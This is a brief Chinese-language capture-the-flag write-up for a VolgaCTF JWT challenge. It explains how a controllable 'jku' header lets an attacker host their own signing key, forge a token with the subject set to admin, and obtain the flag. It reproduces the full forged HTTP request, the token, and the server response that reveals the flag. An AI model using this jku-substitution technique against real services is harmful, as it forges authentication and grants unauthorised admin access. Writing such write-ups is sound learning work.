# JWT

jku 可控，可以指定任意 URL (SSRF)

生一組 key，讓 jku 指過來

然後把 user 改成 admin 再產 signature 送過去，就能拿到 flag

```
GET /say-hi HTTP/1.1
Host: 172.105.68.62:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4274.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.105.68.62:8080/sign-in
Accept-Encoding: gzip, deflate
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: JSESSIONID=06C237D2D2AE1B165ED9A1F65063E569; token=eyJraWQiOiJIUzI1NiIsImFsZyI6IkhTMjU2In0.eyJqa3UiOiJodHRwOi8va2FpYnJvLnR3L2p3dC5qc29uIiwiZXhwIjoxNjE3NDYzNTA0LCJqdGkiOiJ6OGlhV1NrMEVJMF96REhRaWtRNWt3IiwiaWF0IjoxNjE2ODU4NzA0LCJuYmYiOjE2MTY4NTg1ODQsInN1YiI6ImFkbWluIn0.Dq4sd08VyKUigk1x4gjemzs1VvbipQHuJRhtEJzNXU0
Connection: close

```

=>

```
HTTP/1.1 200 
Set-Cookie: JSESSIONID=6B251B586E11F79F5118ABF798EE1F3E; Path=/; HttpOnly
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Type: text/html;charset=utf-8
Content-Language: zh-TW
Content-Length: 539
Date: Sat, 27 Mar 2021 15:59:12 GMT
Connection: close


<!DOCTYPE HTML>
<html>
<head>
  <title>Main Page</title>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
  <link rel="stylesheet" type="text/css" href="css/style.css">
</head>
<body>
<div class="login-box">
  
    <h2>Hello, admin</h2>
    <div style="color: #03e9f4">
      Flag is here VolgaCTF{jW5_jku_5u85T1TUt10n}
    </div>
    <div class="submit-button">
      <span></span>
      <span></span>
      <span></span>
      <span></span>
      <a href="/logout">Logout</a>
    </div>
  
</div>
</body>
</html>
```
